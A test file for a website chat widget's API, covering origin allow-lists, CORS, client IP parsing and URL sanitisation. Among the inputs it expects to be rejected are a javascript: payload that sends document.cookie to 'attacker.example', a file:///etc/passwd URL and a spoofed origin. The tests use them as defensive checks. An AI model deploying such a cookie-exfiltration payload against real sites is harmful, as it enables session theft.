import { DEFAULT_WIDGET_THEME, safeHttpUrl } from '@parbot/shared';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';

import { PLANS } from '@/lib/plans';

import {
  appOrigin,
  clientIp,
  configCacheControl,
  corsHeaders,
  firstIssue,
  gateWidgetSettings,
  installSnippet,
  isOriginAllowed,
  isValidOriginEntry,
  jsonError,
  originAllowed,
  parseWidgetSettings,
  requestOrigin,
  retryAfter,
  widgetChatSchema,
  widgetConfigFor,
  widgetLeadSchema,
  widgetSettingsOf,
  type WidgetSettings,
} from './widget-api';
import { assistantRow, createFakeService, PUBLIC_KEY } from './widget-api.fixtures';

describe('isOriginAllowed', () => {
  it('allows any site, including no origin at all, when the list is empty', () => {
    expect(isOriginAllowed('https://anything.example', [])).toBe(true);
    expect(isOriginAllowed(null, [])).toBe(true);
    expect(isOriginAllowed(null, ['  ', ''])).toBe(true);
  });

  it('refuses a missing or malformed origin once the list has entries', () => {
    expect(isOriginAllowed(null, ['docs.example.com'])).toBe(false);
    expect(isOriginAllowed('not a url', ['docs.example.com'])).toBe(false);
    expect(isOriginAllowed('ftp://docs.example.com', ['docs.example.com'])).toBe(false);
  });

  it('matches full origins exactly, scheme and port included', () => {
    const list = ['https://docs.example.com'];

    expect(isOriginAllowed('https://docs.example.com', list)).toBe(true);
    expect(isOriginAllowed('http://docs.example.com', list)).toBe(false);
    expect(isOriginAllowed('https://docs.example.com:8443', list)).toBe(false);
    expect(isOriginAllowed('https://www.example.com', list)).toBe(false);
  });

  it('matches bare hostnames on any scheme, with an optional port', () => {
    expect(isOriginAllowed('https://docs.example.com', ['docs.example.com'])).toBe(true);
    expect(isOriginAllowed('http://docs.example.com', ['docs.example.com'])).toBe(true);
    expect(isOriginAllowed('http://localhost:3000', ['localhost:3000'])).toBe(true);
    expect(isOriginAllowed('http://localhost:4000', ['localhost:3000'])).toBe(false);
    expect(isOriginAllowed('http://localhost:4000', ['localhost'])).toBe(true);
  });

  it('compares hostnames case-insensitively', () => {
    expect(isOriginAllowed('https://Docs.Example.com', ['docs.example.com'])).toBe(true);
    expect(isOriginAllowed('https://docs.example.com', ['DOCS.EXAMPLE.COM'])).toBe(true);
    expect(isOriginAllowed('https://docs.example.com', ['HTTPS://DOCS.EXAMPLE.COM'])).toBe(true);
  });

  it('expands *.example.com to the apex and every subdomain', () => {
    const list = ['*.example.com'];

    expect(isOriginAllowed('https://example.com', list)).toBe(true);
    expect(isOriginAllowed('https://docs.example.com', list)).toBe(true);
    expect(isOriginAllowed('https://a.b.example.com', list)).toBe(true);
    expect(isOriginAllowed('https://notexample.com', list)).toBe(false);
    expect(isOriginAllowed('https://example.com.evil.io', list)).toBe(false);
  });

  it('accepts a match anywhere in the list', () => {
    expect(isOriginAllowed('https://b.io', ['https://a.io', 'b.io', '*.c.io'])).toBe(true);
    expect(isOriginAllowed('https://d.io', ['https://a.io', 'b.io', '*.c.io'])).toBe(false);
  });
});

describe('isValidOriginEntry', () => {
  it('accepts origins, hostnames, ports and wildcards', () => {
    for (const entry of [
      'https://docs.example.com',
      'http://localhost:3000',
      'docs.example.com',
      'localhost:3000',
      '*.example.com',
      ' docs.example.com ',
    ]) {
      expect(isValidOriginEntry(entry), entry).toBe(true);
    }
  });

  it('rejects paths, queries, odd schemes and garbage', () => {
    for (const entry of [
      '',
      '   ',
      'https://docs.example.com/guide',
      'https://docs.example.com/?x=1',
      'ftp://x.io',
      'javascript:alert(1)',
      'docs example',
      '*.',
      '-bad.io',
    ]) {
      expect(isValidOriginEntry(entry), entry).toBe(false);
    }
  });
});

describe('requestOrigin', () => {
  const request = (headers: Record<string, string>) =>
    new Request('http://localhost:3000/api/widget/config', { headers });

  it('prefers the Origin header and normalises it', () => {
    expect(requestOrigin(request({ origin: 'https://Docs.Example.com/' }))).toBe(
      'https://docs.example.com',
    );
  });

  it('falls back to the Referer for same-origin GETs, and treats "null" as absent', () => {
    expect(
      requestOrigin(request({ referer: 'http://localhost:3000/demo/pb_x?mode=palette' })),
    ).toBe('http://localhost:3000');
    expect(requestOrigin(request({ origin: 'null', referer: 'https://a.io/page' }))).toBe(
      'https://a.io',
    );
    expect(requestOrigin(request({}))).toBeNull();
  });
});

describe('originAllowed', () => {
  it('always lets the app itself through, so the demo page and preview work', () => {
    const app = appOrigin();

    expect(app).toMatch(/^https?:\/\//);
    expect(originAllowed(app, ['docs.example.com'])).toBe(true);
    expect(originAllowed('https://elsewhere.io', ['docs.example.com'])).toBe(false);
    expect(originAllowed(null, ['docs.example.com'])).toBe(false);
  });
});

describe('corsHeaders and clientIp', () => {
  it('echoes the origin when there is one and opens up otherwise', () => {
    expect(corsHeaders('https://a.io')['access-control-allow-origin']).toBe('https://a.io');
    expect(corsHeaders(null)['access-control-allow-origin']).toBe('*');
    expect(corsHeaders().vary).toBe('Origin');
  });

  it('takes the platform address first, else the last forwarded hop, never the first', () => {
    const vercel = new Request('http://x', {
      headers: {
        'x-vercel-forwarded-for': '198.51.100.7',
        'x-real-ip': '198.51.100.2',
        'x-forwarded-for': '203.0.113.9, 10.0.0.1',
      },
    });
    const real = new Request('http://x', {
      headers: { 'x-real-ip': '198.51.100.2', 'x-forwarded-for': '203.0.113.9, 10.0.0.1' },
    });
    const forwarded = new Request('http://x', {
      headers: { 'x-forwarded-for': ' 203.0.113.9 , 10.0.0.1 ' },
    });
    const single = new Request('http://x', { headers: { 'x-forwarded-for': '203.0.113.9' } });

    expect(clientIp(vercel)).toBe('198.51.100.7');
    expect(clientIp(real)).toBe('198.51.100.2');
    expect(clientIp(forwarded)).toBe('10.0.0.1');
    expect(clientIp(single)).toBe('203.0.113.9');
    expect(clientIp(new Request('http://x', { headers: { 'x-forwarded-for': ' , ' } }))).toBe(
      'unknown',
    );
    expect(clientIp(new Request('http://x'))).toBe('unknown');
  });

  it('announces the longest wait among the full buckets, in whole seconds, never zero', () => {
    const open = { allowed: true, remaining: 3, retryAfterMs: 0 };

    expect(retryAfter([open, open])).toBeNull();
    expect(
      retryAfter([
        open,
        { allowed: false, remaining: 0, retryAfterMs: 1400 },
        { allowed: false, remaining: 0, retryAfterMs: 30_500 },
      ]),
    ).toBe('31');
    expect(retryAfter([{ allowed: false, remaining: 0, retryAfterMs: 0 }])).toBe('1');
  });
});

describe('jsonError and configCacheControl', () => {
  it('writes the message in both shapes with CORS headers', async () => {
    const response = jsonError(429, 'rate_limited', 'Slow down.', { 'retry-after': '5' });

    expect(response.status).toBe(429);
    expect(response.headers.get('retry-after')).toBe('5');
    expect(response.headers.get('access-control-allow-origin')).toBe('*');
    await expect(response.json()).resolves.toEqual({
      error: { code: 'rate_limited', message: 'Slow down.' },
      message: 'Slow down.',
    });
  });

  it('caches a plain config request briefly and a versioned one not at all', () => {
    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1'))).toBe(
      'public, max-age=60',
    );
    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v=2'))).toBe(
      'no-store',
    );
    expect(configCacheControl(new Request('http://x/api/widget/config?key=pb_1&v='))).toBe(
      'no-store',
    );
  });
});

describe('widget request bodies', () => {
  const chat = {
    key: PUBLIC_KEY,
    visitorId: 'v_0123456789abcdef0123456789abcdef',
    conversationId: '22222222-2222-4222-8222-222222222222',
    message: 'Hi',
  };
  const lead = { key: chat.key, visitorId: chat.visitorId, email: 'ada@example.com' };

  it('keeps an http(s) page url, trimmed', () => {
    expect(
      widgetChatSchema.parse({ ...chat, pageUrl: ' https://docs.example.com/a?b=1 ' }).pageUrl,
    ).toBe('https://docs.example.com/a?b=1');
    expect(widgetLeadSchema.parse({ ...lead, pageUrl: 'http://localhost:3000/x' }).pageUrl).toBe(
      'http://localhost:3000/x',
    );
    expect(widgetChatSchema.parse(chat).pageUrl).toBeUndefined();
  });

  it('drops any other page url without refusing the request', () => {
    for (const pageUrl of [
      'javascript:alert(1)',
      "javascript:fetch('//attacker.example/'+document.cookie)",
      'data:text/html,hi',
      'file:///etc/passwd',
      '/relative',
      'docs.example.com',
      '',
      `https://docs.example.com/${'x'.repeat(2048)}`,
    ]) {
      const chatResult = widgetChatSchema.safeParse({ ...chat, pageUrl });
      const leadResult = widgetLeadSchema.safeParse({ ...lead, pageUrl });

      expect(chatResult.success, pageUrl).toBe(true);
      expect(chatResult.data?.pageUrl, pageUrl).toBeUndefined();
      expect(leadResult.success, pageUrl).toBe(true);
      expect(leadResult.data?.pageUrl, pageUrl).toBeUndefined();
    }

    expect(widgetChatSchema.safeParse({ ...chat, pageUrl: 42 }).success).toBe(false);
  });
});

describe('safeHttpUrl', () => {
  it('passes http and https addresses through and refuses every other scheme', () => {
    expect(safeHttpUrl('https://docs.example.com/a?b=1#c')).toBe(
      'https://docs.example.com/a?b=1#c',
    );
    expect(safeHttpUrl('  http://localhost:3000  ')).toBe('http://localhost:3000');
    expect(safeHttpUrl('HTTPS://Docs.Example.com')).toBe('HTTPS://Docs.Example.com');

    for (const value of [
      'javascript:alert(1)',
      'JavaScript:alert(1)',
      'data:text/html,hi',
      'mailto:a@b.co',
      'ftp://x.io',
      '/relative',
      'https://',
      'not a url',
      '',
      null,
      undefined,
      42,
    ]) {
      expect(safeHttpUrl(value), String(value)).toBeNull();
    }
  });
});

describe('firstIssue', () => {
  it('names the field', () => {
    const result = z.object({ email: z.email() }).safeParse({ email: 'nope' });

    expect(result.success).toBe(false);

    if (!result.success) {
      expect(firstIssue(result.error)).toMatch(/^email: /);
    }
  });
});

describe('widgetConfigFor', () => {
  const assistant = assistantRow() as unknown as Parameters<typeof widgetConfigFor>[0];

  it('folds every gated setting back to the free value on Hobby', () => {
    expect(widgetConfigFor(assistant, PLANS.hobby)).toEqual({
      assistantId: assistant.id,
      name: 'Docs bot',
      welcomeMessage: 'Ask me about the docs.',
      suggestedQuestions: ['One', 'Two', 'Three', 'Four'],
      mode: 'bubble',
      theme: DEFAULT_WIDGET_THEME,
      hideBranding: false,
      leadCapture: false,
      modes: ['bubble'],
    });
  });

  it("keeps the owner's choices on Starter", () => {
    expect(widgetConfigFor(assistant, PLANS.starter)).toMatchObject({
      mode: 'palette',
      theme: { scheme: 'dark', accent: '#2563eb', position: 'left', radius: 'lg' },
      hideBranding: true,
      leadCapture: true,
      modes: ['bubble', 'palette'],
    });
  });

  it('never trusts a malformed theme or mode from the database', () => {
    const odd = { ...assistant, mode: 'sidebar', theme: { accent: 'red' } };

    expect(widgetConfigFor(odd, PLANS.growth)).toMatchObject({
      mode: 'bubble',
      theme: DEFAULT_WIDGET_THEME,
    });
  });
});

describe('parseWidgetSettings', () => {
  const form = (fields: Record<string, string>) => {
    const data = new FormData();

    for (const [name, value] of Object.entries(fields)) {
      data.set(name, value);
    }

    return data;
  };

  const valid = {
    mode: 'palette',
    scheme: 'dark',
    accent: '#2563EB',
    position: 'left',
    radius: 'lg',
    welcomeMessage: '  Hi there  ',
    suggestedQuestions: 'One\n\n Two \r\nThree',
    allowedOrigins: 'docs.example.com\n*.example.com\n',
    hideBranding: 'on',
    leadCapture: 'on',
  };

  it('reads the form, splitting lines and lower-casing the accent', () => {
    expect(parseWidgetSettings(form(valid))).toEqual({
      success: true,
      data: {
        mode: 'palette',
        theme: { scheme: 'dark', accent: '#2563eb', position: 'left', radius: 'lg' },
        welcomeMessage: 'Hi there',
        suggestedQuestions: ['One', 'Two', 'Three'],
        allowedOrigins: ['docs.example.com', '*.example.com'],
        hideBranding: true,
        leadCapture: true,
      },
    });
  });

  it('defaults what a gated form leaves out', () => {
    expect(parseWidgetSettings(form({ mode: 'bubble', welcomeMessage: 'Hi' }))).toEqual({
      success: true,
      data: {
        mode: 'bubble',
        theme: DEFAULT_WIDGET_THEME,
        welcomeMessage: 'Hi',
        suggestedQuestions: [],
        allowedOrigins: [],
        hideBranding: false,
        leadCapture: false,
      },
    });
  });

  it('explains what is wrong', () => {
    expect(parseWidgetSettings(form({ ...valid, welcomeMessage: ' ' }))).toEqual({
      success: false,
      error: 'Write a welcome message.',
    });
    expect(parseWidgetSettings(form({ ...valid, suggestedQuestions: '1\n2\n3\n4\n5' }))).toEqual({
      success: false,
      error: 'List at most 4 suggested questions.',
    });
    expect(
      parseWidgetSettings(form({ ...valid, allowedOrigins: 'https://docs.example.com/guide' })),
    ).toEqual({
      success: false,
      error: 'Origins look like https://docs.example.com, docs.example.com or *.example.com.',
    });
    expect(parseWidgetSettings(form({ ...valid, accent: 'red' }))).toEqual({
      success: false,
      error: 'The accent must be a six digit hex colour.',
    });
    expect(parseWidgetSettings(form({ ...valid, mode: 'sidebar' })).success).toBe(false);
  });
});

describe('gateWidgetSettings', () => {
  const base: WidgetSettings = {
    mode: 'bubble',
    theme: { ...DEFAULT_WIDGET_THEME },
    welcomeMessage: 'Hi',
    suggestedQuestions: [],
    allowedOrigins: [],
    hideBranding: false,
    leadCapture: false,
  };

  it('passes free settings on every plan', () => {
    expect(gateWidgetSettings(base, PLANS.hobby)).toBeNull();
    expect(gateWidgetSettings(base, PLANS.growth)).toBeNull();
  });

  it('names the first rule Hobby breaks', () => {
    expect(gateWidgetSettings({ ...base, mode: 'palette' }, PLANS.hobby)).toMatch(/palette/i);
    expect(
      gateWidgetSettings({ ...base, theme: { ...base.theme, accent: '#2563eb' } }, PLANS.hobby),
    ).toMatch(/theme/i);
    expect(
      gateWidgetSettings({ ...base, theme: { ...base.theme, position: 'left' } }, PLANS.hobby),
    ).toMatch(/theme/i);
    expect(gateWidgetSettings({ ...base, hideBranding: true }, PLANS.hobby)).toMatch(/branding/i);
    expect(gateWidgetSettings({ ...base, leadCapture: true }, PLANS.hobby)).toMatch(
      /lead capture/i,
    );
  });

  it('lets Starter use all of them', () => {
    const everything: WidgetSettings = {
      ...base,
      mode: 'palette',
      theme: { scheme: 'light', accent: '#0F172A', position: 'left', radius: 'sm' },
      hideBranding: true,
      leadCapture: true,
    };

    expect(gateWidgetSettings(everything, PLANS.starter)).toBeNull();
  });
});

describe('widgetSettingsOf and installSnippet', () => {
  it('reads a row into form values, tolerating bad stored data', () => {
    const settings = widgetSettingsOf(
      assistantRow({ mode: 'weird', theme: null }) as unknown as Parameters<
        typeof widgetSettingsOf
      >[0],
    );

    expect(settings).toMatchObject({
      mode: 'bubble',
      theme: DEFAULT_WIDGET_THEME,
      hideBranding: true,
      leadCapture: true,
    });
  });

  it('builds the script tag against the app url', () => {
    expect(installSnippet(PUBLIC_KEY, 'https://app.parbot.dev/')).toBe(
      `<script async src="https://app.parbot.dev/widget.js" data-parbot="${PUBLIC_KEY}"></script>`,
    );
  });
});

describe('fake service', () => {
  it('filters rows and records inserts, so the route tests can rely on it', async () => {
    const fake = createFakeService({ assistants: [assistantRow()] });

    const found = await fake.client
      .from('assistants')
      .select('id')
      .eq('public_key', PUBLIC_KEY)
      .maybeSingle();
    const missing = await fake.client
      .from('assistants')
      .select('id')
      .eq('public_key', 'pb_nope')
      .maybeSingle();

    expect(found.data).toMatchObject({ name: 'Docs bot' });
    expect(missing.data).toBeNull();

    const result = await fake.client
      .from('leads')
      .insert({ assistant_id: 'a', owner_id: 'o', email: 'a@b.co' });

    expect(result.error).toBeNull();
    expect(fake.inserted.leads).toHaveLength(1);
  });
});
